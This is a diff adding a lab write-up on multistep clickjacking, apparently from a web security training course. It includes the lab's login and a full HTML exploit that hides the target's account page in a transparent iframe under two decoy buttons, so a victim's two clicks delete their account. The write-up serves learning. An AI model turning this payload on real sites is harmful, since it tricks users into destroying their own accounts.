@@ -1,0 +1,71 @@
+Multistep Clickjacking
+
+**Category**: Clickjacking  
+**Difficulty**: Practitioner  
+
+---
+
+## Overview / What I Learned
+
+This lab demonstrated how to exploit multi-step UI interactions via clickjacking.  
+It involved tricking a user into clicking two different elements within an iframe:  
+1. The "Delete account" button  
+2. The confirmation "Yes" button  
+
+The key challenge was to align two decoy buttons on an attacker-controlled page over the iframe-loaded target page to trigger a destructive action.
+
+---
+
+## Exploit Steps / Methodology
+
+### 1. Recon and Setup
+
+- Logged into the target account using credentials: `wiener:peter`
+- Navigated to `/my-account` to locate the "Delete account" and confirmation button
+- Noticed the confirmation step made the attack **multi-step**, requiring two clicks
+
+### 2. Crafted the Exploit HTML
+
+Used an iframe to load the vulnerable page and overlaid it with two clickable divs.
+
+Key parts:
+- Set iframe to low opacity (`0.0001`) so it remains invisible
+- Positioned two divs:
+  - First aligns with "Delete account"
+  - Second aligns with the "Yes" confirmation
+
+### 3. Final Exploit Payload
+
+```html
+<style>
+  iframe {
+    position: relative;
+    width: 500px;
+    height: 700px;
+    opacity: 0.0001;
+    z-index: 2;
+  }
+
+  .firstClick, .secondClick {
+    position: absolute;
+    background-color: white;
+    padding: 10px;
+    cursor: pointer;
+    z-index: 1;
+  }
+
+  .firstClick {
+    top: 330px;
+    left: 50px;
+  }
+
+  .secondClick {
+    top: 285px;
+    left: 225px;
+  }
+</style>
+
+<div class="firstClick">Click me first</div>
+<div class="secondClick">Click me next</div>
+
+<iframe src="https://labId.web-security-academy.net/my-account"></iframe>
